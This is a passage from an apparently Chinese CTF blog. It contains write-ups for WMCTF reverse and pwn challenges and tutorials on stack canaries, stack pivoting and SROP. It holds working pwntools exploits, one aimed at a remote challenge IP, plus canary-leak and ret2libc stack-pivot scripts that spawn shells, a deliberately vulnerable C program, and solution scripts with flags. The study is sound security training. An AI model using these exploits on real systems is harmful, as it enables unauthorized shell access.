edi, ebx              ; 89df\n0000000000006057: (                   ): or eax, ebx               ; 09d8\n0000000000006059: (                   ): not edx                   ; f7d2\n000000000000605b: (                   ): not edi                   ; f7d7\n000000000000605d: (                   ): or edx, edi               ; 09fa\n000000000000605f: (                   ): and eax, edx              ; 21d0\n0000000000006061: (                   ): mov edx, eax              ; 89c2\n0000000000006063: (                   ): mov ebx, 0x24114514       ; bb14451124\n0000000000006068: (                   ): mov edi, ebx              ; 89df\n000000000000606a: (                   ): not eax                   ; f7d0\n000000000000606c: (                   ): not ebx                   ; f7d3\n000000000000606e: (                   ): and eax, ebx              ; 21d8\n0000000000006070: (                   ): not eax                   ; f7d0\n0000000000006072: (                   ): and edx, edi              ; 21fa\n0000000000006074: (                   ): not edx                   ; f7d2\n0000000000006076: (                   ): and eax, edx              ; 21d0\n0000000000006078: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n000000000000607b: (                   ): jmp .+102 (0x000060e3)    ; eb66\n000000000000607d: (                   ): shl esi, 0x02             ; c1e602\n0000000000006080: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n0000000000006083: (                   ): shl edi, 0x02             ; c1e702\n0000000000006086: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n0000000000006089: (                   ): mov edx, eax              ; 89c2\n000000000000608b: (                   ): mov edi, ebx              ; 89df\n000000000000608d: (                   ): not eax                   ; f7d0\n000000000000608f: (                   ): not ebx                   ; f7d3\n0000000000006091: (                   ): and eax, ebx              ; 21d8\n0000000000006093: (                   ): not eax                   ; f7d0\n0000000000006095: (                   ): and edx, edi              ; 21fa\n0000000000006097: (                   ): not edx                   ; f7d2\n0000000000006099: (                   ): and eax, edx              ; 21d0\n000000000000609b: (                   ): mov edx, eax              ; 89c2\n000000000000609d: (                   ): mov ebx, 0x01919810       ; bb10989101\n00000000000060a2: (                   ): mov edi, ebx              ; 89df\n00000000000060a4: (                   ): not ebx                   ; f7d3\n00000000000060a6: (                   ): and eax, ebx              ; 21d8\n00000000000060a8: (                   ): not edx                   ; f7d2\n00000000000060aa: (                   ): and edx, edi              ; 21fa\n00000000000060ac: (                   ): or eax, edx               ; 09d0\n00000000000060ae: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n00000000000060b1: (                   ): jmp .+48 (0x000060e3)     ; eb30\n00000000000060b3: (                   ): shl esi, 0x02             ; c1e602\n00000000000060b6: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n00000000000060b9: (                   ): shl edi, 0x02             ; c1e702\n00000000000060bc: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n00000000000060bf: (                   ): mov edx, eax              ; 89c2\n00000000000060c1: (                   ): mov edi, ebx              ; 89df\n00000000000060c3: (                   ): not ebx                   ; f7d3\n00000000000060c5: (                   ): and eax, ebx              ; 21d8\n00000000000060c7: (                   ): not edx                   ; f7d2\n00000000000060c9: (                   ): and edx, edi              ; 21fa\n00000000000060cb: (                   ): or eax, edx               ; 09d0\n00000000000060cd: (                   ): mov edx, eax              ; 89c2\n00000000000060cf: (                   ): mov ebx, 0x19260817       ; bb17082619\n00000000000060d4: (                   ): mov edi, ebx              ; 89df\n00000000000060d6: (                   ): or eax, ebx               ; 09d8\n00000000000060d8: (                   ): not edx                   ; f7d2\n00000000000060da: (                   ): not edi                   ; f7d7\n00000000000060dc: (                   ): or edx, edi               ; 09fa\n00000000000060de: (                   ): and eax, edx              ; 21d0\n00000000000060e0: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n00000000000060e3: (                   ): shr esi, 0x02             ; c1ee02\n00000000000060e6: (                   ): inc esi                   ; 46\n00000000000060e7: (                   ): jmp .-218 (0x00006012)    ; e926ffffff\n00000000000060ec: (                   ): inc ecx                   ; 41\n00000000000060ed: (                   ): jmp .-238 (0x00006004)    ; e912ffffff\n00000000000060f2: (                   ): xor ecx, ecx              ; 31c9\n00000000000060f4: (                   ): xor edx, edx              ; 31d2\n00000000000060f6: (                   ): cmp ecx, 0x00000012       ; 83f912\n00000000000060f9: (                   ): jz .+25 (0x00006114)      ; 7419\n00000000000060fb: (                   ): shl ecx, 0x01             ; d1e1\n00000000000060fd: (                   ): mov ax, word ptr ds:[ecx-19092685] ; 3e668b8133abdcfe\n0000000000006105: (                   ): mov bx, word ptr ds:[ecx] ; 3e668b19\n0000000000006109: (                   ): cmp ax, bx                ; 6639d8\n000000000000610c: (                   ): jz .+1 (0x0000610f)       ; 7401\n000000000000610e: (                   ): inc edx                   ; 42\n000000000000610f: (                   ): shr ecx, 0x01             ; d1e9\n0000000000006111: (                   ): inc ecx                   ; 41\n0000000000006112: (                   ): jmp .-30 (0x000060f6)     ; ebe2\n0000000000006114: (                   ): cmp edx, 0x00000000       ; 83fa00\n0000000000006117: (                   ): jnz .+98 (0x0000617b)     ; 7562\n0000000000006119: (                   ): mov byte ptr gs:0x00000320, 0x41 ; 65c6052003000041\n0000000000006121: (                   ): mov byte ptr gs:0x00000321, 0x02 ; 65c6052103000002\n0000000000006129: (                   ): mov byte ptr gs:0x00000322, 0x63 ; 65c6052203000063\n0000000000006131: (                   ): mov byte ptr gs:0x00000323, 0x02 ; 65c6052303000002\n0000000000006139: (                   ): mov byte ptr gs:0x00000324, 0x63 ; 65c6052403000063\n0000000000006141: (                   ): mov byte ptr gs:0x00000325, 0x02 ; 65c6052503000002\n0000000000006149: (                   ): mov byte ptr gs:0x00000326, 0x65 ; 65c6052603000065\n0000000000006151: (                   ): mov byte ptr gs:0x00000327, 0x02 ; 65c6052703000002\n0000000000006159: (                   ): mov byte ptr gs:0x00000328, 0x73 ; 65c6052803000073\n0000000000006161: (                   ): mov byte ptr gs:0x00000329, 0x02 ; 65c605290300000\n0000000000006169: (                   ): mov byte ptr gs:0x0000032a, 0x73 ; 65c6052a03000073\n0000000000006171: (                   ): mov byte ptr gs:0x0000032b, 0x02 ; 65c6052b03000002\n0000000000006179: (                   ): jmp .+64 (0x000061bb)     ; eb40\n000000000000617b: (                   ): mov byte ptr gs:0x00000320, 0x46 ; 65c6052003000046\n0000000000006183: (                   ): mov byte ptr gs:0x00000321, 0x04 ; 65c6052103000004\n000000000000618b: (                   ): mov byte ptr gs:0x00000322, 0x61 ; 65c6052203000061\n0000000000006193: (                   ): mov byte ptr gs:0x00000323, 0x04 ; 65c6052303000004\n000000000000619b: (                   ): mov byte ptr gs:0x00000324, 0x69 ; 65c6052403000069\n00000000000061a3: (                   ): mov byte ptr gs:0x00000325, 0x04 ; 65c6052503000004\n00000000000061ab: (                   ): mov byte ptr gs:0x00000326, 0x6c ; 65c605260300006c\n00000000000061b3: (                   ): mov byte ptr gs:0x00000327, 0x04 ; 65c6052703000004\n00000000000061bb: (                   ): jmp .-2 (0x000061bb)      ; ebfe\n```\n\n代码很长，\n\n最后的全局段内存处分别是ACCESS和FAIL，即数据校验成功与否。\n\n接着分析上面代码即可，一点一点动调可以摸出大体逻辑：\n\n第一层大循环0x81/3次，内部进行3次小循环（每个循环9次），对数据进行加密\n\n\n\n> EAX、EBX：用于从内存取数，或者送入内存\n>\n> ECX: 负责记数，每执行完成一个小循环（9次），inc ecx\n>\n> ESI、EDI：负责作为段内偏移来寻址，同时esi还用来记录小循环内部的循环次数\n\n由于炜哥博客很详细，所以我只提一下一个困惑我很长时间的内容——取内存的问题\n\n主要看这两条指令：\n\n```assembly\n mov eax, dword ptr ds:[esi]\n mov ebx, dword ptr ds:[edi]\n```\n\nesi，edi的值决定着ds段基址的偏移，\n\n![image-20200805144842040](https://i.loli.net/2020/08/05/CHvORtU94N8hpKj.png)\n\n通过动调可以发现ebx总是取到的eax后四个字节的数据，但是di到了0x20之后会被重新归零\n\n![](https://i.loli.net/2020/08/05/PkWFHLha5jui8gU.png)\n\n所以可以看出ds段数据的地址范围是0x00-0x20，即36个字节，正好与flag的字节数一致。\n\n继续动调在关键的几个指令处你会发现\n\n![](https://i.loli.net/2020/08/05/NAhVnGqvsJaE7e3.png)\n\n也就是说对于每一次加密，加密后的数据会覆盖到原本数据的位置。\n\n如：原数据：1，2，3，4，5\n\n　　第一次：取出1，2进行加密，加密得3，则覆盖到原本1的位置，现在的内存为3，2，3，4，5\n\n　　第二次：再取出2，3进行加密，加密得5，则内存变为：3，5，3，4，5\n\n　　以此类推，加密0x81×9次\n\n\n\n现在搞懂了加密规则，再来看校验的步骤\n\n```assembly\n00000000000060f2: (): xor ecx, ecx             \n00000000000060f4: (): xor edx, edx            \n00000000000060f6: (): cmp ecx, 0x00000012       //循环0x12次，即十进制18次\n00000000000060f9: (): jz .+25 (0x00006114)     //如果满0x12次，直接跳转判断edx的值\n00000000000060fb: (): shl ecx, 0x01             //ecx左移一位，相当于乘2\n00000000000060fd: (): mov ax, word ptr ds:[ecx-19092685]//取校验数据，低16位放入ax\n0000000000006105: ( ): mov bx, word ptr ds:[ecx]//内存处取加密过的数据，低16位放入bx\n0000000000006109: (): cmp ax, bx               //比较，如果不相等edx+1\n000000000000610c: (): jz .+1 (0x0000610f)    \n000000000000610e: (): inc edx               \n000000000000610f: (): shr ecx, 0x01          //ecx右移1位，相当于除以2\n0000000000006111: (): inc ecx                //ecx加1\n0000000000006112: (): jmp .-30 (0x000060f6)   //跳转比较ecx和0x12的大小\n0000000000006114: (): cmp edx, 0x00000000      //如果edx不等于0，则失败\n0000000000006117: (): jnz .+98 (0x0000617b)    \n```\n\n在0x0006109处下断点，然后动调一下观察ecx如何变化\n\n![](https://i.loli.net/2020/08/05/9dzXOYig1WmrEJL.png)\n\n![](https://i.loli.net/2020/08/05/nRQHUTb6AIOPVWG.png)\n\n![](https://i.loli.net/2020/08/05/E2LPbZ5q68ltArf.png)\n\n可以看到每次取数据时，ecx偏移加2\n\n一开始由于ax和eax等寄存器的误导，实在没想通这一块代码\n\n现在知道两者差别后终于搞懂了....\n\n> 加密时，一次取4个字节，循环9次，即36个字节，内存区域ds:[0x0]-ds:[0x20]。\n>\n> 校验时，一次取2个字节，循环18次，也是36个字节，内存区域相同。\n\n所以，全部明白之后，题目就迎刃而解了。\n\n至于加密方法是三个数据异或，这是我没有想到的...\n\n放上上**官方exp**\n\n```python\nenc_flag = [0xec5574d8,0x421a04b5,0x2ba6d11,0x8105055f,0xeda06c28,0x6ae00499,0x18a955e7,0x71d63591,0x4537a864]\nfor n in range(128,-1,-1):               #129轮逻辑运算\n    for i in range(8,-1,-1):           #臭死力\n        if (n%3 == 0):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x24114514\n        elif(n%3 == 1):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x1919810\n        elif(n%3 == 2):\n            enc_flag[i] = enc_flag[i]^enc_flag[(i+1)%9]^0x19260817\ngroup = [None] * (len(enc_flag) * 4) #36字节\nfor i in range(9):\n    for n in range(4):\n        group[i*4+n] = (enc_flag[i]>>(8*n))&0xff\nfor i in range(len(group)):#凯撒解密\n    group[i] = (group[i] - 0x55)%0x100\n\nflag = [None] * len(group)\nfor i in range(6):#行列密码解密\n    for n in range(6):\n        flag[i*6+n] = group[n*6+i]\nkey_board_mapping = {0x2:'1',0x3:'2',0x4:'3',0x5:'4',0x6:'5',0x7:'6',0x8:'7',0x9:'8',0xa:'9',0xb:'0',0xc:'_',0xd:'+',0x10:'q',0x11:'w',0x12:'e',0x13:'r',0x14:'t',0x15:'y',0x16:'u',0x17:'i',0x18:'o',0x19:'p',0x1a:'{',0x1b:'}',0x1e:'a',0x1f:'s',0x20:'d',0x21:'f',0x22:'g',0x23:'h',0x24:'j',0x25:'k',0x26:'l',0x2c:'z',0x2d:'x',0x2e:'c',0x2f:'v',0x30:'b',0x31:'n',0x32:'m',0x39:' ',}\nfor i in range(len(flag)):#键盘映射回去\n    if flag[i]>0x39:\n        flag[i] -= 0x30\n        flag[i] = key_board_mapping[flag[i]].upper()\n    else:\n        flag[i] = key_board_mapping[flag[i]]\nfor i in flag:\n    print(i,end = '')\n    \n#WMCTF{D0_Y0u_kn0w_th3_Pr0t3ct3dM0d3}\n#也可以解出数后按照数组手动还原\n```\n\n------\n\n# 0x04 mengyedekending\n\n一道windows pwn，用C#写的，第一次做，代码好不容易才看懂，太菜了太菜了...\n\n拿过题来是这些东西\n\n![](https://i.loli.net/2020/08/06/3qGKAzEmVytMucQ.png)\n\n用IDA打开baby_Cat.exe很乱找不到有用的函数，但有很多类似的字符串信息\n\n![](https://i.loli.net/2020/08/29/JrjSYVqvFPBATkR.png)\n\n可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。\n\n找到主函数，分析代码：\n\n```c\nprivate unsafe static void Main(string[] args)\n\t\t{\n\t\t\tchar* ptr = stackalloc char[(UIntPtr)100]; //开辟100大小的空间\n\t\t\tint num = 1;\n\t\t\tint* ptr2 = (int*)(ptr + 50);    // ptr2指向ptr偏移50的位置\n\t\t\tProgram @object = new Program();\n\t\t\tProgram.MsgHandler msgHandler = new Program.MsgHandler(@object.Right);\n\t\t\tProgram.MsgHandler msgHandler2 = new Program.MsgHandler(@object.Backdoor);//  backdoor\n\t\t\tConsole.WriteLine(\"This is a gift for you : {0:x4}\", &num);//输出num的地址\n\t\t\tConsole.WriteLine(\"What do you want me to repeat?\");\n\t\t\tptr2[1] = 0;  //记录输入的字符个数\n\t\t\tptr2[2] = ptr; //指向ptr\n\t\t\t*ptr2 = 0; //即ptr[50] = 0\n\t\t\twhile (ptr2[1] < 53)\n\t\t\t{\n\t\t\t\tchar c = (char)Console.Read(); //读入字符\n\t\t\t\tbool flag = c == '\\n'; //若换行符则跳出\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tbool flag2 = c == '\\r';//若不是回车则进入循环\n\t\t\t\tif (!flag2)\n\t\t\t\t{\n\t\t\t\t\tptr[*ptr2] = c;//将字符写入\n\t\t\t\t\tptr2[1]++;\n\t\t\t\t}\n\t\t\t\t(*ptr2)++;//偏移量+1\n\t\t\t}\n\t\t\tConsole.WriteLine(\"Do you want to change your input?\");\n\t\t\tchar c2 = (char)Console.Read();\n\t\t\tbool flag3 = c2 == 'N' || c2 == 'n';\n\t\t\tif (flag3)\n\t\t\t{\n\t\t\t\tmsgHandler(ptr);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Please tell me a offset!\");\n\t\t\t\tchar* ptr3 = ptr2[2];\n\t\t\t\tConsole.ReadLine();\n\t\t\t\tint num2 = Console.Read();\n\t\t\t\tfor (int i = 0; i < num2; i++)\n\t\t\t\t{\n\t\t\t\t\tchar* ptr4 = ptr3 + i;\n\t\t\t\t\t*ptr4 -= '\\u0001'; //对内存的数—1\n\t\t\t\t}\n\t\t\t\tbool flag4 = num == 1;\n\t\t\t\tif (flag4)\n\t\t\t\t{\n\t\t\t\t\tmsgHandler(ptr);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tmsgHandler2(ptr);        //后门函数\n\t\t\t\t}\n\t\t\t}\n\t\t}\n```\n\n后门函数长这样:\n\n![](https://i.loli.net/2020/08/06/Op35ZHshlN1tk86.png)\n\n分析完毕，目标就是令num==0，绕过去执行这个后门函数\n\n程序关键点在这：\n\n![](https://i.loli.net/2020/08/06/S2mAMz3L9WFnKhZ.png)\n\n`ptr[*ptr2]`存放着我们的输入c，而\\*ptr2指向了ptr+50的位置，这个位置的值初始化为0，也就是说，我们的输入放在ptr[0]的位置，接着\\*ptr2++，使得输入逐渐后移。（啊！万恶的指针）\n\n而程序没有对数组边界进行检查，所以存在数组越界漏洞\n\n目标也很清楚了，由于程序第一个输出告诉了我们num的地址，那么我们只要找到num和输入的偏移，更改*ptr2的值，使其指向&num-1的位置，下一次就可以覆盖到num==0了，进而执行backdoor\n\ndnspy动态调试，\n\n![](https://i.loli.net/2020/08/06/dyKL8Ef6NPCmHut.png)\n\n所以可以计算偏移量：(0x02CFF000-0x02CFEF29)/2 = 0x6B  （C#使用的宽字节）\n\n因此覆盖ptr[50] ==0x6b，下一次覆盖num=='\\x00'\n\n## 0x05 exp\n\n```python\nfrom pwn import *\np = remote('111.73.46.229', 51000)\ncontext.log_level = 'debug'\npayload = \"A\" * 50 + chr(0x6b) + '\\x00'\np.sendline(payload)\np.recv()\np.sendline('y')\np.recv()\np.sendline('1 hail ld1ng!')#动调发现当首字符ascii<83时有效，原因在于最后的循环\n#p.sendline('\\x00')#或者 send 0 直接跳出最后一个循环\np.interactive()\n```\n\n![](https://i.loli.net/2020/08/06/EfSHcGaAC6TvqNP.png)\n\n成功~\n\n# 0x06 小结\n\n**WMware**的出题人是魔鬼，全程考察汇编能力，好多都是微机原理学过的内容（全忘干净了），趁此机会复习一下吧。\n\n不过看大神们说可以用IDA？我的IDA可能有自己的想法，还是算了...\n\n**mengyedekending**看上去不难，这题比赛有35解\n\n但是第一次做这种类型的题还是很难受的，特别是指针的问题，在pwn中是重点，必须好好掌握\n\n这次比赛还是有收获的，噶油！","tags":["CTF","wp","ADWorld"],"categories":["REVERSE"]},{"title":"学习canary&&栈迁移","url":"/2020/07/01/canary/","content":"\n# 0x00 前言\n\n刚开始接触canary，先不谈题目中如何利用，只记一下我对它浅显的理解\n\n------\n\n2020.7.3\n\n回头看了一遍第五空间的pwn题(twice)，用了canary和栈迁移的知识，正好整合在一起\n\n学了很长时间，终于搞懂了，最近有考试，等考完详细记录一下。\n\n------\n\n2020.7.16\n\n终于考完试复现一下这道题，中途电脑坏了拿去修，不过还好盘没坏，什么都没丢，万幸万幸~\n\n# 0x01 canary\n\n什么是canary呢？\n\nCanary 的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 \n\n这里的canary也具有相似的功能，放在栈底用于检测是否发生栈溢出，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。\n\n------\n\n## 0x02 原理\n\nx86栈结构：\n\n![image-20200701172055740](https://i.loli.net/2020/07/01/OPEoZQd7nupaBj8.png)\n\n主要说一下x86下的canary，x64类似\n\n栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。\n\n当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。\n\n攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。\n\n## 0x03 leak canary\n\n之前有个题目比较简单[Mary_Morton](http://ld1ng.com/2020/06/03/ADWorld-pwn/#0x04-Mary-Morton)，存在明显的格式化字符串漏洞，可以泄露canary的值\n\n这里讲一下另外一种方法\n\n为了便于理解，写一个简单的程序自己调一下\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\nvoid getshell(void) {\n    system(\"/bin/sh\");\n}\nvoid init() {\n    setbuf(stdin, NULL);\n    setbuf(stdout, NULL);\n    setbuf(stderr, NULL);\n}\nvoid vuln() {\n    char buf[100];\n    for(int i=0;i<2;i++){\n        read(0, buf, 0x200);\n        puts(buf);\n    }\n}\nint main(void) {\n    init();\n    puts(\"Hello Hacker!\");\n    vuln();\n    return 0;\n}\n```\n\n```shell\ngcc -m32 -no-pie canary.c -o canary //无PIE保护\n```\n\n编译之后可以运行，输入两次数据结束\n\n职业病，拖进IDA\n\n![image-20200701162154035](https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png)\n\n主要看一下vuln函数，`buf`是我们开辟的缓冲区，大小70H（十进制112），但是我们只定义了100个大小，为什么会多12字节的大小呢\n\n然后v3很奇怪，源码中并没有定义这个变量，看到最后return，自己和自己异或，很明显做了一次检查，只有两次相等时才能return 0，所以可以知道v3就是canary\n\n再看v3在栈中的位置`ebp-C`正好符合条件。\n\n即输入100个字符之后就是canary\n\n为了进一步搞清楚泄露canary的原理，可以gdb调试一下\n\n![image-20200701163648373](https://i.loli.net/2020/07/01/Bx4Ld7kSaJ3EGHl.png)\n\n左面是输入了99个'A'，右面输入100个'A'，可以明显看出我画红线位置的不同，其中0x0a是100个A之后的换行符，而buf大小刚好是100\n\n- 当输入99个A时，加上0x0a的换行标记，正好100个字符占满buf\n\n- 当输入100个A时，buf刚好被占满，这时0x0a的换行符覆盖掉了后四位字节的最低位（如图所示），由于32位程序中，canary为四个字节，所以0x0a覆盖掉的就是canary的最低位/x00\n\n  \n\n> canary最低位0x00起到截断字符串的作用，在有些函数处理时，会把这个字符当做结束符，即为了防止printf、puts等函数读出它的值，所以说，如果canary真的只靠这个来防御的话，那么只需要覆盖掉0x00，便可以读取它的值\n\n\n\n## 0x04 exp\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\ncontext.binary = 'can'\n# context.log_level = 'debug'\nio = process('./canary')\nget_shell=ELF(\"./canary\").sym[\"getshell\"]\n#获得getshell的地址\nio.recvuntil(\"Hello Hacker!\\n\")\npayload = \"A\"*100\nio.sendline(payload)\nio.recvuntil(\"A\"*100)\nCanary = u32(io.recv(4))-0xa #继续接收后四位数据，并减掉0x0a\nlog.info(\"Canary:\"+hex(Canary))\npayload = b\"\\x90\"*100+p32(Canary)+b\"\\x90\"*12+p32(get_shell)\nio.send(payload)\nio.recv()\nio.interactive()\n```\n\n![image-20200701170620675](https://i.loli.net/2020/07/01/PiuQAro8GFBZ9W3.png)\n\n成功~\n\n------\n\n# 0x05 栈迁移原理\n\n以32位程序举例，在使用`call`这个命令，进入一个函数的时候,程序一般情况下会进行三步栈操作:\n\n> push eip+4;\n>\n> push ebp;\n>\n> mov ebp,esp;\n\n以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。\n\n在执行完函数后也会进行一系列对应的操作来还原现场`leave;ret;`\n\n这边的leave就相当于进入函数栈操作的逆过程。\n\n>leave  == mov esp,ebp; pop ebp;\n>ret    == pop eip #弹出栈顶数据给eip寄存器\n\n\n\n这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）\n\n## 0x06 栈迁移的利用\n\n栈迁移一般在什么情况下利用呢？\n\n它主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）\n\n所以我们就要通过控制ebp来绕过限制。\n\n由于`ret`返回的是栈顶数据，而栈顶地址是由esp寄存器的值决定的，也就是说如果我们控制了\n\nesp寄存器的数据，那么我们也就能够控制ret返回的栈顶数据。\n\n现在我们已经知道了 leave 能够将ebp寄存器的数据mov到esp寄存器中，然而，一开始ebp寄存\n\n器中的值并不是由我们来决定的，重点是接下来的那个`pop ebp`的操作，该操作将栈中保存的ebp\n\n数据赋值给了ebp寄存器，而我们正好能够控制该部分数据。所以利用思路便成立了。\n\n我们首先将栈中保存ebp数据的地址空间控制为我们想要栈顶地址，再利用两次`leave`操作`mov `\n\n`esp,ebp;pop ebp;mov esp,ebp;pop ebp;`将esp寄存器中的值变成我们想让它成为的值。由\n\n于最后还有一个`pop ebp`操作多余，该操作将导致`esp-4`，所以在构造ret的数据时应当考虑到将\n\n数据放到我们构造的esp地址-4的位置。（即栈顶留4位/8位给ebp/rbp）\n\n------\n\n## 0x07 2020第五空间 twice\n\n拿2020第五空间的一道pwn题说一下\n\n只存在canary保护，拖入IDA\n\n主函数是这样的\n\n![image-20200716122318894](https://i.loli.net/2020/07/16/mJDaQHuXNKwbv3z.png)\n\n跟进`sub_4007A9`函数\n\n![image-20200716122231147](https://i.loli.net/2020/07/16/lfrT6CLRhGMuKSt.png)\n\n其实可以看出来，主函数初始化ncount为0，为的是将4007A9循环两次\n\n查看栈情况\n\n![image-20200716122755224](https://i.loli.net/2020/07/16/d5gVkCaqOGmrlYA.png)\n\n输入的s之后88位就是v6，即canary\n\n再看v3，跟进40076D\n\n![image-20200716123046878](https://i.loli.net/2020/07/16/OBTfVRevcmMw1NH.png)\n\n结合read函数，第一次可以输入89个字符，恰好可以覆盖到canary最低位，所以第一次用来泄露canary和rbp\n\n第二次可以输入112个字符，先算一下，88+8(canary)+8(saved rbp)+8(return addr)=112\n\n显然长度不够，因此第二次输入来构造栈迁移\n\n可以将新栈放在函数刚输入的位置\n\ngdb先调试一下\n\n![image-20200716121859353](https://i.loli.net/2020/07/16/m9x6IMgld3wtPnz.png)\n\n计算出旧rbp与输入位置差0x70，因此新rbp=leak_rbp-0x70\n\n因此通过两次leave就可以完成新rbp的迁移\n\n## 0x08 exp\n\n写了挺久的...\n\n主要是考试之前试过能跑的脚本现在不行了，libcseacher搜不到2.23的版本，不明原因，众所周知pwn是门玄学，没办法Ubuntu16的本地库做的\n\n```python\nfrom pwn import *\ncontext.log_level=\"debug\"\ncontext.arch='amd64'\nelf=ELF('./pwn1')\nsh=process('./pwn1')\nlibc = ELF(\"libc-2.23.so\") \n#本地，ubuntu16.4\n#sh=remote(\"121.36.59.116\",9999)\n\nleave_ret=0x0400879     #leave的地址\npop_rdi=0x0400923\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\nsh.recvuntil(\">\")\nsh.send('a'*89)\nsh.recvuntil(\"a\"*89)\ncannay=u64(sh.recv(7).rjust(8,\"\\x00\"))       #最后一位用\\x00覆盖回去\nstack_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))-0x70  #旧rbp -0x70\n\nprint \"cannry: \"+hex(cannay)\nprint \"stack_addr: \"+hex(stack_addr)\nsh.recvuntil(\">\")\npayload=flat([stack_addr+0x60,pop_rdi,puts_got,puts_plt,0x0400630]) \n#flat模块能将pattern字符串和地址结合并且转为字节模式，\n#返回地址0x400630是start函数，或者可以用main函数地址\npayload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)\n#构造栈迁移\nsh.send(payload)\nsh.recvuntil(\"\\n\")\nputs_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))\nprint \"puts_addr: \"+hex(puts_addr)\n\n#leak libc \nlibc_base=puts_addr-libc.sym['puts']\nsystem_addr=libc_base+libc.sym['system']\nprint \"system_addr:\"+hex(system_addr)\nbinsh_a =libc_base + 0x18ce17#\"/bin/sh\"的偏移地址\n#leak again \nsh.recvuntil(\">\")\nsh.send('a'*89)\nsh.recvuntil(\"a\"*89)\ncannay=u64(sh.recv(7).rjust(8,\"\\x00\"))\nstack_addr=u64(sh.recv(6).ljust(8,\"\\x00\"))-0x70 \n\nprint \"cannry: \"+hex(cannay)\nprint \"stack_addr: \"+hex(stack_addr)\nsh.recvuntil(\">\")\npayload=flat([stack_addr+0x60,pop_rdi,binsh_a,system_addr,0x0400630])\npayload+='a'*48+p64(cannay)+p64(stack_addr)+p64(leave_ret)\nsh.send(payload)\n\nsh.interactive()\n\n```\n\n主要思路是利用第一次read泄露canary和旧rbp\n\n第二次read构造栈迁移，本来想多写点的，但是拿起题真的不知道该咋写了\n\n第一次看确实不好理解，还是要结合前面栈迁移的原理，自己动手做一下\n\n话说张老师已经开始让我写堆了，我却还在栈上纠结..\n\n# 0x09 SROP\n\n[SROP](https://www.yuque.com/hxfqg9/bin/erh0l7#cS7rH)\n\nSROP(Sigreturn Oriented Programming) ，其中，`sigreturn`是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④\n\n![Process of Signal Handlering](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png)\n\n内核为进程保留相应的上下文的方法主要是：**将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址**，此时栈的情况是这样的：\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/signal2-stack.png)\n\n我们**称 ucontext 以及 siginfo 这一段为 signal frame**，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过 signal handler 中处理相应的 signal，因此，当 signal handler 执行完成后就会**执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器**，然后恢复进程的执行\n\n32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15\n\n假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-1.png)\n\n当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。\n\n有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可\n\n- **控制栈指针。**\n- **把原来 rip 指向的`syscall` gadget 换成`syscall; ret` gadget。**\n\n如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。\n\n![signal2-stack](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-2.png)\n\nrax = 15，执行syscall，便可将sigframe的值恢复。\n\n模板：\n\n```python\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rdi = stack_addr + 0x120  # \"/bin/sh\" 's addr\nsigframe.rsi = 0x0\nsigframe.rdx = 